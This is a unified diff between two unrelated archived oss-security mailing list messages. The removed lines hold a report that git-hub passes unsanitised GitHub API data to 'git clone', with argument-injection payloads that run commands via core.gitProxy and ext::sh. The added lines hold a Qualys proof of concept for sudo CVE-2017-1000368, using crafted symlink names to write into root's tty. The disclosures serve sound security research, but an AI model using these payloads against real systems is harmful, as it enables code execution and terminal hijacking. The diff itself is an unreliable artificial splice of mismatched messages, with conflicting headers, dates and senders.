@@ -1,35 +1,38 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/16/3
-Message-ID: <20170216110843.xvy6khoffph6yy45@jwilk.net>
-Date: Thu, 16 Feb 2017 12:08:43 +0100
-From: Jakub Wilk <jwilk@...lk.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/06/6
+Message-ID: <20170606223100.GD27224@localhost.localdomain>
+Date: Tue, 6 Jun 2017 15:31:00 -0700
+From: Qualys Security Advisory <qsa@...lys.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: git-hub: missing sanitization of data received from GitHub
+Subject: Re: Arbitrary terminal access via sudo on Linux
 Content-Type: text/plain; charset=utf-8
 
-* Jakub Wilk <jwilk@...lk.net>, 2016-09-29, 17:40:
->git-hub <https://github.com/sociomantic-tsunami/git-hub> is a Git 
->command-line interface to GitHub. When you ask it to clone a 
->repository, it will call:
->
->  git clone <repourl> <reponame>
->
->where both <repourl> and <reponame> come from GitHub API, without any 
->sanitization. Operators of the GitHub server (or a MitM attacker[*]) 
->could exploit it for directory traversal or, more excitingly, for 
->arbitrary code execution, either via option injection, e.g.:
->
->  git clone 'git://-esystem("cowsay pwned > \x2fdev\x2ftty")/' --config=core.gitProxy=perl
->
->or more directly with git-remote-ext, e.g.:
->
->  git clone 'ext::sh -c cowsay% pwned% >% /dev/tty' moo
+On Fri, Jun 02, 2017 at 12:55:10PM -0600, Todd C. Miller wrote:
+> However, the arbitrary tty access IS exploitable in 1.8.20p1.
 
-git-spindle is another GitHub CLI, which can be exploited in the same way:
-https://github.com/seveas/git-spindle/issues/154
+For example, against Sudo < 1.8.20p1:
 
-(git-spindle used to be called "git-hub", but this is different codebase that 
-sociomantic's git-hub.)
+$ /usr/bin/sudo -l
+...
+User john may run the following commands on localhost:
+    (nobody) /usr/bin/sum
+
+$ ln -s /usr/bin/sudo '     1026 '
+(1026 is tty2, currently used by root)
+
+$ ./'     1026 ' -r unconfined_r -u nobody /usr/bin/sum $'--\nHELLO\nWORLD\n'
+(this is written to root's tty2)
+
+Or, against Sudo = 1.8.20p1:
+
+$ ln -s /usr/bin/sudo $')     1026 \n'
+$ ./$')     1026 \n' -r unconfined_r -u nobody /usr/bin/sum $'--\nHELLO\nWORLD\n'
+
+CVE-2017-1000368 was assigned to this newline vulnerability:
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000368
+
+With best regards,
 
 -- 
-Jakub Wilk
+the Qualys Security Advisory team
